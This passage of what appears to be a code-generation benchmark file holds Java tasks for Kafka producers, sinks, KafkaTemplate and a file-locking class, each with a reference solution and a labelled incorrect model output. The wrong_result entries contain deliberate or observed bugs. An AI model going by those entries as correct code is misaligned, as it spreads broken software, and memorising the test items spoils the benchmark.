headers.add(RULE_MODE, toBytes(ctx.ruleMode().name()));\n    headers.add(RULE_SUBJECT, toBytes(ctx.subject()));\n    headers.add(RULE_TOPIC, toBytes(ctx.topic()));\n    if (ex != null) {\n      headers.add(RULE_EXCEPTION, toBytes(ex.getMessage()));\n    }\n  }\n\n  private byte[] toBytes(String value) {\n    if (value != null) {\n      return value.getBytes(StandardCharsets.UTF_8);\n    } else {\n      return null;\n    }\n  }\n\n  static Map<String, Object> baseProducerConfigs() {\n    Map<String, Object> producerProps = new HashMap<>();\n    producerProps.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, Long.toString(Long.MAX_VALUE));\n    producerProps.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, \"false\");\n    producerProps.put(ProducerConfig.ACKS_CONFIG, \"all\");\n    producerProps.put(ProducerConfig.MAX_IN_FLIGHT_REQUESTS_PER_CONNECTION, \"1\");\n    producerProps.put(ProducerConfig.DELIVERY_TIMEOUT_MS_CONFIG,\n        Integer.toString(Integer.MAX_VALUE));\n    return producerProps;\n  }\n\n  @Override\n  public void close() {\n    if (producer != null) {\n      producer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class DlqAction implements RuleAction {\n    private final Logger log;\n    private static final String TYPE = \"DLQ\";\n    private static final String DLQ_TOPIC = \"dlq.topic\";\n    private static final String DLQ_AUTO_FLUSH = \"dlq.auto.flush\";\n    private static final String PRODUCER = \"producer\";\n    private static final String HEADER_PREFIX = \"rule.\";\n    private static final String RULE_NAME = \"name\";\n    private static final String RULE_MODE = \"mode\";\n    private static final String RULE_SUBJECT = \"subject\";\n    private static final String RULE_TOPIC = \"topic\";\n    private static final String RULE_EXCEPTION = \"exception\";\n    private Map<String, ?> configs;\n    private String topic;\n    private boolean autoFlush;\n    private KafkaProducer<byte[], byte[]> producer;\n\n    public DlqAction(Logger log) {\n        this.log = log;\n    }\n\n    public void configure(Map<String, ?> configs) {\n        this.configs = configs;\n        this.topic = (String) configs.get(DLQ_TOPIC);\n        this.autoFlush = Boolean.parseBoolean(configs.getOrDefault(DLQ_AUTO_FLUSH, \"true\").toString());\n        this.producer = producer();\n    }\n\n    public void run(RuleContext ctx, Object message, RuleException ex) {\n        if (topic == null) {\n            log.error(\"DLQ topic not configured\");\n            return;\n        }\n        try {\n            byte[] payload = convertToBytes(ctx, message);\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(topic, payload);\n            populateHeaders(ctx, record, ex);\n            producer.send(record, (metadata, exception) -> {\n                if (exception != null) {\n                    log.error(\"Failed to send message to DLQ\", exception);\n                } else {\n                    log.info(\"Message sent to DLQ: {}\", metadata.offset());\n                }\n            });\n            if (autoFlush) {\n                producer.flush();\n            }\n        } catch (Exception e) {\n            log.error(\"Error processing message in DLQ action\", e);\n        }\n    }\n\n    public KafkaProducer<byte[], byte[]> producer() {\n        if (producer == null) {\n            Map<String, Object> producerConfig = baseProducerConfigs();\n            producerConfig.putAll(configs);\n            producer = new KafkaProducer<>(producerConfig);\n        }\n        return producer;\n    }\n\n    private byte[] convertToBytes(RuleContext ctx, Object message) {\n        if (message instanceof String) {\n            return toBytes((String) message);\n        } else if (message instanceof Serializable) {\n            return convertToJsonBytes(ctx, message);\n        } else if (message instanceof byte[]) {\n            return (byte[]) message;\n        } else {\n            log.warn(\"Unsupported message type: {}\", message.getClass().getName());\n            return new byte[0];\n        }\n    }\n\n    private byte[] convertToJsonBytes(RuleContext ctx, Object message) {\n        try {\n            ObjectMapper mapper = new ObjectMapper();\n            return mapper.writeValueAsBytes(message);\n        } catch (JsonProcessingException e) {\n            log.error(\"Failed to serialize message to JSON\", e);\n            return new byte[0];\n        }\n    }\n\n    private void populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\n        producerRecord.headers().put(\n            HEADER_PREFIX + RULE_NAME,\n            ctx.getRuleName().getBytes(StandardCharsets.UTF_8)\n        );\n        producerRecord.headers().put(\n            HEADER_PREFIX + RULE_MODE,\n            ctx.getRuleMode().getBytes(StandardCharsets.UTF_8)\n        );\n        producerRecord.headers().put(\n            HEADER_PREFIX + RULE_SUBJECT,\n            ctx.getRuleSubject().getBytes(StandardCharsets.UTF_8)\n        );\n        producerRecord.headers().put(\n            HEADER_PREFIX + RULE_TOPIC,\n            ctx.getOriginalTopic().getBytes(StandardCharsets.UTF_8)\n        );\n        producerRecord.headers().put(\n            HEADER_PREFIX + RULE_EXCEPTION,\n            ex.getMessage().getBytes(StandardCharsets.UTF_8)\n        );\n    }\n\n    private byte[] toBytes(String value) {\n        return value.getBytes(StandardCharsets.UTF_8);\n    }\n\n    private Map<String, Object> baseProducerConfigs() {\n        Map<String, Object> config = new HashMap<>();\n        config.put(\"bootstrap.servers\", \"localhost:9092\");\n        config.put(\"key.serializer\", \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n        config.put(\"value.serializer\", \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n        return config;\n    }\n\n    public void close() {\n        if (producer != null) {\n            producer.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 257,
    "Instruction": "Task Description: Create a Kafka sink class that writes data to a Kafka topic, with configuration parameters for the Kafka producer and topic name.\n\nClass Description: The KafkaSink class is a self-documenting sink that takes data from an observable stream, encodes it, and writes it to a specified Kafka topic. It handles Kafka producer initialization, message sending, and resource cleanup.\n\nAttributes:\n- encoder: [Func1<T, byte[]>] - Function to encode the input data into byte arrays\n- registry: [Registry] - Metrics registry for monitoring\n- kafkaProducerAtomicRef: [AtomicReference<KafkaProducer<byte[], byte[]>>] - Thread-safe reference to the Kafka producer instance\n- subscription: [Subscription] - Subscription to the observable data stream\n\nMethods:\n- call: [call(Context context, PortRequest ignore, Observable<T> dataO)] -> [void] - Initializes the Kafka producer if needed and subscribes to the input observable to send data to Kafka\n- getParameters: [getParameters()] -> [List<ParameterDefinition<?>>] - Returns the list of parameter definitions for Kafka configuration and topic name\n- metadata: [metadata()] -> [Metadata] - Provides metadata about the sink including name and description\n- close: [close()] -> [void] - Cleans up resources by unsubscribing from the observable stream",
    "Canonical_solution": "import com.netflix.spectator.api.Registry;\nimport io.mantisrx.runtime.Context;\nimport io.mantisrx.runtime.Metadata;\nimport io.mantisrx.runtime.PortRequest;\nimport io.mantisrx.runtime.parameter.ParameterDefinition;\nimport io.mantisrx.runtime.parameter.Parameters;\nimport io.mantisrx.runtime.parameter.type.StringParameter;\nimport io.mantisrx.runtime.parameter.validator.Validators;\nimport io.mantisrx.runtime.sink.SelfDocumentingSink;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport rx.Observable;\nimport rx.Subscription;\nimport rx.functions.Func1;\nimport rx.schedulers.Schedulers;\n\npublic class KafkaSink<T> implements SelfDocumentingSink<T> {\n    private static final Logger logger = LoggerFactory.getLogger(KafkaSink.class);\n    private final Func1<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef = new AtomicReference<>(null);\n    private Subscription subscription;\n\n    KafkaSink(Registry registry, Func1<T, byte[]> encoder) {\n        this.encoder = encoder;\n        this.registry = registry;\n    }\n\n    @Override\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        if (kafkaProducerAtomicRef.get() == null) {\n            MantisKafkaProducerConfig mantisKafkaProducerConfig = new MantisKafkaProducerConfig(context);\n            Map<String, Object> producerProperties = mantisKafkaProducerConfig.getProducerProperties();\n            KafkaProducer<byte[], byte[]> kafkaProducer = new KafkaProducer<>(producerProperties);\n            kafkaProducerAtomicRef.compareAndSet(null, kafkaProducer);\n            logger.info(\"Kafka Producer initialized\");\n        }\n        KafkaProducer<byte[], byte[]> kafkaProducer = kafkaProducerAtomicRef.get();\n        Parameters parameters = context.getParameters();\n        String topic = (String)parameters.get(KafkaSinkJobParameters.TOPIC);\n\n        subscription = dataO.map(encoder::call)\n            .flatMap((dataBytes) ->\n                         Observable.from(kafkaProducer.send(new ProducerRecord<>(topic, dataBytes)))\n                             .subscribeOn(Schedulers.io()))\n            .subscribe();\n    }\n\n    @Override\n    public List<ParameterDefinition<?>> getParameters() {\n        final List<ParameterDefinition<?>> params = new ArrayList<>();\n        params.add(new StringParameter()\n                       .name(KafkaSinkJobParameters.TOPIC)\n                       .description(\"Kafka topic to write to\")\n                       .validator(Validators.notNullOrEmpty())\n                       .required()\n                       .build());\n        params.addAll(MantisKafkaProducerConfig.getJobParameterDefinitions());\n        return params;\n    }\n\n    @Override\n    public Metadata metadata() {\n        StringBuilder description = new StringBuilder();\n        description.append(\"Writes the output of the job into the configured Kafka topic\");\n\n        return new Metadata.Builder()\n            .name(\"Mantis Kafka Sink\")\n            .description(description.toString())\n            .build();\n    }\n\n    @Override\n    public void close() {\n        subscription.unsubscribe();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class KafkaSink<T> {\n    private final Function<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef = new AtomicReference<>();\n    private Subscription subscription;\n\n    public KafkaSink(Function<T, byte[]> encoder, Registry registry) {\n        this.encoder = encoder;\n        this.registry = registry;\n    }\n\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        KafkaProducer<byte[], byte[]> producer = kafkaProducerAtomicRef.get();\n        if (producer == null) {\n            Properties props = new Properties();\n            props.put(\"bootstrap.servers\", context.getParameter(\"bootstrap.servers\"));\n            props.put(\"key.serializer\", context.getParameter(\"key.serializer\"));\n            props.put(\"value.serializer\", context.getParameter(\"value.serializer\"));\n            producer = new KafkaProducer<>(props);\n            kafkaProducerAtomicRef.set(producer);\n        }\n        subscription = dataO.subscribe(item -> {\n            byte[] messageBytes = encoder.apply(item);\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(context.getParameter(\"topic.name\"), messageBytes);\n            producer.send(record);\n        });\n    }\n\n    public List<ParameterDefinition<?>> getParameters() {\n        return Arrays.asList(\n            new ParameterDefinition<>(\"bootstrap.servers\", String.class, \"Kafka bootstrap servers\"),\n            new ParameterDefinition<>(\"key.serializer\", String.class, \"Key serializer class\"),\n            new ParameterDefinition<>(\"value.serializer\", String.class, \"Value serializer class\"),\n            new ParameterDefinition<>(\"topic.name\", String.class, \"Kafka topic name\")\n        );\n    }\n\n    public Metadata metadata() {\n        return new Metadata(\"KafkaSink\", \"Sends data to a Kafka topic\");\n    }\n\n    public void close() {\n        if (subscription != null) {\n            subscription.unsubscribe();\n        }\n        KafkaProducer<byte[], byte[]> producer = kafkaProducerAtomicRef.get();\n        if (producer != null) {\n            producer.close();\n            kafkaProducerAtomicRef.set(null);\n        }\n    }\n}"
  },
  {
    "Task_id": 258,
    "Instruction": "Task Description: Create a Java class that implements a Kafka producer for sending partition metric samples to a Kafka topic, with configurable producer properties and error handling.\n\nClass Description: KafkaSampleProducer is a class that provides functionality to create and manage a Kafka producer for sending partition metric samples. It handles producer configuration, message sending, and proper resource cleanup.\n\nAttributes:\n- PRODUCER_CLOSE_TIMEOUT: [Duration] - The maximum time to wait for the producer to close gracefully\n- _shutdown: [boolean] - Flag indicating whether the producer should be shut down\n- _producer: [Producer<byte[], byte[]>] - The Kafka producer instance\n\nMethods:\n- createProducer: [void]([Map<String, ?> config, String producerClientId]) -> [void] - Configures and creates a Kafka producer instance with the given configuration and client ID\n- storePartitionMetricSamples: [AtomicInteger]([MetricSampler.Samples samples, Producer<byte[], byte[]> producer, String partitionMetricSampleStoreTopic, Logger log]) -> [AtomicInteger] - Sends partition metric samples to the specified Kafka topic and returns the count of successfully sent samples\n- close: [void]([]) -> [void] - Gracefully shuts down the Kafka producer with a timeout",
    "Canonical_solution": "import com.linkedin.kafka.cruisecontrol.monitor.sampling.holder.PartitionMetricSample;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport org.slf4j.Logger;\n\nimport static com.linkedin.kafka.cruisecontrol.monitor.sampling.SamplingUtils.bootstrapServers;\n\npublic class KafkaSampleProducer {\n    protected static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofMinutes(3);\n    protected volatile boolean _shutdown = false;\n    protected Producer<byte[], byte[]> _producer;\n\n    protected void createProducer(Map<String, ?> config, String producerClientId) {\n        Properties producerProps = new Properties();\n        producerProps.putAll(config);\n        producerProps.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers(config));\n        producerProps.setProperty(ProducerConfig.CLIENT_ID_CONFIG, producerClientId);\n        producerProps.setProperty(ProducerConfig.LINGER_MS_CONFIG, \"30000\");\n        producerProps.setProperty(ProducerConfig.BATCH_SIZE_CONFIG, \"500000\");\n        producerProps.setProperty(ProducerConfig.BUFFER_MEMORY_CONFIG, \"67108864\");\n        producerProps.setProperty(ProducerConfig.RETRIES_CONFIG, \"5\");\n        producerProps.setProperty(ProducerConfig.COMPRESSION_TYPE_CONFIG, \"gzip\");\n        producerProps.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.RECONNECT_BACKOFF_MS_CONFIG, config.get(\"reconnect.backoff.ms\").toString());\n        _producer = new KafkaProducer<>(producerProps);\n    }\n\n    static AtomicInteger storePartitionMetricSamples(MetricSampler.Samples samples, Producer<byte[], byte[]> producer,\n                                                   String partitionMetricSampleStoreTopic, Logger log) {\n        final AtomicInteger metricSampleCount = new AtomicInteger(0);\n        for (PartitionMetricSample sample : samples.partitionMetricSamples()) {\n            producer.send(new ProducerRecord<>(partitionMetricSampleStoreTopic, null, sample.sampleTime(), null, sample.toBytes()),\n                        (recordMetadata, e) -> {\n                            if (e == null) {\n                                metricSampleCount.incrementAndGet();\n                            } else {\n                                log.error(\"Failed to produce partition metric sample for {} of timestamp {} due to exception\",\n                                          sample.entity().tp(), sample.sampleTime(), e);\n                            }\n                        });\n        }\n        return metricSampleCount;\n    }\n\n    public void close() {\n        _shutdown = true;\n        _producer.close(PRODUCER_CLOSE_TIMEOUT);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.slf4j.Logger;\nimport java.time.Duration;\nimport java.util.List;\n\npublic class KafkaSampleProducer {\n    private static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofSeconds(10);\n    private boolean _shutdown;\n    private Producer<byte[], byte[]> _producer;\n\n    public void createProducer(Map<String, Object> config, String producerClientId) {\n        config.put(\"client.id\", producerClientId);\n        _producer = new KafkaProducer<>(config);\n        _shutdown = false;\n    }\n\n    public AtomicInteger storePartitionMetricSamples(List<String> samples, Producer<byte[], byte[]> producer, String partitionMetricSampleStoreTopic, Logger log) {\n        AtomicInteger count = new AtomicInteger(0);\n        for (String sample : samples) {\n            try {\n                byte[] key = sample.getBytes();\n                byte[] value = sample.getBytes();\n                ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(partitionMetricSampleStoreTopic, key, value);\n                producer.send(record).get();\n                count.incrementAndGet();\n            } catch (Exception e) {\n                log.error(\"Failed to send sample: {}\", e.getMessage());\n            }\n        }\n        return count;\n    }\n\n    public void close() {\n        if (!_shutdown) {\n            _producer.close(PRODUCER_CLOSE_TIMEOUT.toSeconds(), TimeUnit.SECONDS);\n            _shutdown = true;\n        }\n    }\n}"
  },
  {
    "Task_id": 259,
    "Instruction": "Task Description: Create a KafkaTemplate class that provides a high-level abstraction for sending messages to Kafka topics, handling both transactional and non-transactional producers, and managing producer lifecycle.\n\nClass Description: The KafkaTemplate class is a Spring Kafka helper class that simplifies the process of sending messages to Kafka topics. It wraps a ProducerFactory and provides various methods for sending messages with different parameters. The class handles producer creation, message sending, and resource cleanup automatically.\n\nAttributes:\n- producerFactory: [ProducerFactory<K, V>] - The factory used to create Kafka producers\n- autoFlush: [boolean] - Flag indicating whether to automatically flush the producer after sending\n- transactional: [boolean] - Flag indicating whether the producer factory is transactional\n\nMethods:\n- send(String topic, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data to the specified topic without a key\n- send(String topic, K key, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data with a key to the specified topic\n- send(String topic, Integer partition, K key, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data with key and partition to the specified topic\n- send(ProducerRecord<K, V> record) -> [CompletableFuture<SendResult<K, V>>] - Sends a complete ProducerRecord\n- doSend(ProducerRecord<K, V> producerRecord) -> [CompletableFuture<SendResult<K, V>>] - Internal method that handles the actual sending logic\n- partitionsFor(String topic) -> [List<PartitionInfo>] - Returns partition information for the given topic\n- metrics() -> [Map<MetricName, ? extends Metric>] - Returns the producer metrics\n- closeProducer(Producer<K, V> producer, boolean inTx) -> [void] - Closes the producer unless in a transaction\n- getTheProducer() -> [Producer<K, V>] - Gets a producer instance (non-topic specific)\n- getTheProducer(String topic) -> [Producer<K, V>] - Gets a producer instance (optionally topic-specific)\n- inTransaction() -> [boolean] - Checks if currently in a transaction",
    "Canonical_solution": "import org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.Metric;\nimport org.apache.kafka.common.MetricName;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.springframework.kafka.core.ProducerFactory;\nimport org.springframework.kafka.support.SendResult;\nimport org.springframework.util.Assert;\n\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.Future;\n\npublic class KafkaTemplate<K, V> {\n\n    private final ProducerFactory<K, V> producerFactory;\n    private final boolean autoFlush;\n    private final boolean transactional;\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory) {\n        this(producerFactory, false);\n    }\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory, boolean autoFlush) {\n        Assert.notNull(producerFactory, \"'producerFactory' cannot be null\");\n        this.producerFactory = producerFactory;\n        this.autoFlush = autoFlush;\n        this.transactional = this.producerFactory.transactionCapable();\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, K key, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, key, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, Integer partition, K key, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, partition, key, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(ProducerRecord<K, V> record) {\n        Assert.notNull(record, \"'record' cannot be null\");\n        return doSend(record);\n    }\n\n    protected CompletableFuture<SendResult<K, V>> doSend(final ProducerRecord<K, V> producerRecord) {\n        final Producer<K, V> producer = getTheProducer(producerRecord.topic());\n        final CompletableFuture<SendResult<K, V>> future = new CompletableFuture<>();\n        Future<RecordMetadata> sendFuture = producer.send(producerRecord, (metadata, exception) -> {\n            if (exception == null) {\n                future.complete(new SendResult<>(producerRecord, metadata));\n            }\n            else {\n                future.completeExceptionally(\n                        new KafkaProducerException(producerRecord, \"Failed to send\", exception));\n            }\n            closeProducer(producer, this.transactional);\n        });\n        if (sendFuture.isDone()) {\n            try {\n                sendFuture.get();\n            }\n            catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted\", e);\n            }\n            catch (ExecutionException e) {\n                throw new KafkaException(\"Send failed\", e.getCause());\n            }\n        }\n        if (this.autoFlush) {\n            producer.flush();\n        }\n        return future;\n    }\n\n    public List<PartitionInfo> partitionsFor(String topic) {\n        Producer<K, V> producer = getTheProducer();\n        try {\n            return producer.partitionsFor(topic);\n        }\n        finally {\n            closeProducer(producer, inTransaction());\n        }\n    }\n\n    public Map<MetricName, ? extends Metric> metrics() {\n        Producer<K, V> producer = getTheProducer();\n        try {\n            return producer.metrics();\n        }\n        finally {\n            closeProducer(producer, inTransaction());\n        }\n    }\n\n    protected void closeProducer(Producer<K, V> producer, boolean inTx) {\n        if (!inTx) {\n            producer.close();\n        }\n    }\n\n    protected Producer<K, V> getTheProducer() {\n        return getTheProducer(null);\n    }\n\n    protected Producer<K, V> getTheProducer(@Nullable String topic) {\n        if (this.transactional) {\n            Assert.state(inTransaction(),\n                    \"No transaction is in process; possible solutions: run the template operation within the scope of a template.executeInTransaction() operation\");\n            return this.producerFactory.createProducer();\n        }\n        else {\n            return this.producerFactory.createProducer();\n        }\n    }\n\n    public boolean inTransaction() {\n        return this.transactional && TransactionSynchronizationManager.getResource(this.producerFactory) != null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class KafkaTemplate<K, V> {\n    private final ProducerFactory<K, V> producerFactory;\n    private final boolean autoFlush;\n    private final boolean transactional;\n    private boolean inTransaction;\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory, boolean autoFlush, boolean transactional) {\n        this.producerFactory = producerFactory;\n        this.autoFlush = autoFlush;\n        this.transactional = transactional;\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, V data) {\n        return doSend(new ProducerRecord<>(topic, data));\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, K key, V data) {\n        return doSend(new ProducerRecord<>(topic, key, data));\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, Integer partition, K key, V data) {\n        return doSend(new ProducerRecord<>(topic, partition, key, data));\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(ProducerRecord<K, V> record) {\n        return doSend(record);\n    }\n\n    private CompletableFuture<SendResult<K, V>> doSend(ProducerRecord<K, V> record) {\n        Producer<K, V> producer = getTheProducer(record.topic());\n        try {\n            CompletableFuture<SendResult<K, V>> future = producer.send(record);\n            if (autoFlush) {\n                future.thenRun(producer::flush);\n            }\n            return future;\n        } finally {\n            if (!inTransaction) {\n                closeProducer(producer, false);\n            }\n        }\n    }\n\n    public List<PartitionInfo> partitionsFor(String topic) {\n        return producerFactory.partitionsFor(topic);\n    }\n\n    public Map<MetricName, ? extends Metric> metrics() {\n        Producer<K, V> producer = getTheProducer(null);\n        try {\n            return producer.metrics();\n        } finally {\n            closeProducer(producer, false);\n        }\n    }\n\n    private void closeProducer(Producer<K, V> producer, boolean inTx) {\n        if (!inTx) {\n            producer.close();\n        }\n    }\n\n    private Producer<K, V> getTheProducer(String topic) {\n        return producerFactory.createProducer();\n    }\n\n    public boolean inTransaction() {\n        return transactional;\n    }\n}"
  },
  {
    "Task_id": 26,
    "Instruction": "Task Description: Create a Java class that manages job prefix files with thread-safe file operations, including creation, locking, and cleanup.\n\nClass Description: JobPrefixFile is a thread-safe utility class that manages temporary files with unique prefixes. It provides file locking mechanisms to prevent concurrent access issues and handles proper resource cleanup. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- prefix: String - The unique prefix used for the file name\n- file: Path - The path to the managed file\n- channel: FileChannel - The file channel for file operations\n- lock: FileLock - The lock object for thread-safe file access\n\nMethods:\n- create(Path directory) -> JobPrefixFile - Static factory method to create a new instance with default prefix in specified directory\n- create(String prefix, Path directory) -> JobPrefixFile - Static factory method to create a new instance with custom prefix in specified directory\n- tryFromExistingFile(Path file) -> JobPrefixFile - Static method to create an instance from an existing file if it can be locked\n- delete() -> void - Deletes the managed file and releases resources\n- prefix() -> String - Returns the file prefix\n- release() -> void - Releases the file lock and closes the channel\n- close() -> void - Calls release() to implement AutoCloseable interface\n- deleteIfExists(Path file) -> void - Helper method to safely delete a file if it exists\n- close(AutoCloseable closeable) -> void - Static helper method to safely close closeable resources",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.channels.OverlappingFileLockException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.concurrent.ThreadLocalRandom;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nclass JobPrefixFile implements AutoCloseable {\n\n  private static final Logger log = LoggerFactory.getLogger(JobPrefixFile.class);\n\n  private final String prefix;\n  private final Path file;\n\n  private FileChannel channel;\n  private FileLock lock;\n\n  public static JobPrefixFile create(Path directory) throws IOException {\n    return create(null, directory);\n  }\n\n  public static JobPrefixFile create(final String prefix, final Path directory)\n      throws IOException {\n    return new JobPrefixFile(prefix, directory);\n  }\n\n  public static JobPrefixFile tryFromExistingFile(final Path file) throws IOException {\n    Preconditions.checkNotNull(file);\n    final FileChannel channel = FileChannel.open(file, WRITE);\n    final FileLock lock;\n\n    try {\n      lock = channel.tryLock();\n    } catch (OverlappingFileLockException e) {\n      close(channel);\n      return null;\n    } catch (Exception e) {\n      close(channel);\n      throw e;\n    }\n\n    if (lock == null) {\n      close(channel);\n      return null;\n    }\n\n    return new JobPrefixFile(file, channel, lock);\n  }\n\n  private JobPrefixFile(final String prefix, final Path directory) throws IOException {\n    Preconditions.checkNotNull(directory);\n    this.prefix = prefix == null\n                  ? \"tmp-\" + new SimpleDateFormat(\"yyyyMMdd\").format(new Date()) + \"-\"\n                    + toHexString(ThreadLocalRandom.current().nextInt())\n                  : prefix;\n\n    Files.createDirectories(directory);\n    file = directory.resolve(this.prefix);\n    final Path tmp = directory.resolve(this.prefix + \".tmp\");\n    try {\n      this.channel = FileChannel.open(tmp, CREATE_NEW, WRITE);\n      this.lock = channel.lock();\n      Files.move(tmp, file);\n    } catch (Exception e) {\n      deleteIfExists(tmp);\n      deleteIfExists(file);\n      close(this.channel);\n      throw new RuntimeException(\"Failed to create job prefix file \" + file, e);\n    }\n  }\n\n  private JobPrefixFile(final Path file, final FileChannel channel, final FileLock lock)\n      throws IOException, IllegalStateException {\n    this.file = Preconditions.checkNotNull(file, \"file\");\n    this.channel = Preconditions.checkNotNull(channel, \"channel\");\n    this.lock = Preconditions.checkNotNull(lock, \"lock\");\n    this.prefix = file.getFileName().toString();\n  }\n\n  public void delete() {\n    release();\n    deleteIfExists(file);\n  }\n\n  private void deleteIfExists(Path file) {\n    if (file != null) {\n      try {\n        Files.deleteIfExists(file);\n      } catch (Exception e) {\n        log.warn(\"Failed to delete file {}\", file, e);\n      }\n    }\n  }\n\n  public String prefix() {\n    return prefix;\n  }\n\n  public void release() {\n    close(lock);\n    lock = null;\n    close(channel);\n    channel = null;\n  }\n\n  @Override\n  public void close() {\n    release();\n  }\n\n  private static void close(final AutoCloseable closeable) {\n    if (closeable != null) {\n      try {\n        closeable.close();\n      } catch (Exception e) {\n        log.debug(\"Failed to close {}\", closeable.getClass().getSimpleName(), e);\n      }\n    }\n  }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.file.*;\nimport java.util.UUID;\n\npublic final class JobPrefixFile implements AutoCloseable {\n    private final String prefix;\n    private final Path file;\n    private FileChannel channel;\n    private FileLock lock;\n\n    private JobPrefixFile(String prefix, Path file, FileChannel channel, FileLock lock) {\n        this.prefix = prefix;\n        this.file = file;\n        this.channel = channel;\n        this.lock = lock;\n    }\n\n    public static JobPrefixFile create(Path directory) throws IOException {\n        String prefix = UUID.randomUUID().toString();\n        Path file = Files.createTempFile(directory, prefix + \"-\", \".tmp\");\n        FileChannel channel = FileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        FileLock lock = channel.lock();\n        return new JobPrefixFile(prefix, file, channel, lock);\n    }\n\n    public static JobPrefixFile create(String prefix, Path directory) throws IOException {\n        Path file = Files.createTempFile(directory, prefix + \"-\", \".tmp\");\n        FileChannel channel = FileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        FileLock lock = channel.lock();\n        return new JobPrefixFile(prefix, file, channel, lock);\n    }\n\n    public static JobPrefixFile tryFromExistingFile(Path file) throws IOException {\n        if (!Files.exists(file)) {\n            return null;\n        }\n        FileChannel channel = FileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE);\n        FileLock lock = channel.tryLock();\n        if (lock == null) {\n            channel.close();\n            return null;\n        }\n        return new JobPrefixFile(file.getFileName().toString(), file, channel, lock);\n    }\n\n    public void 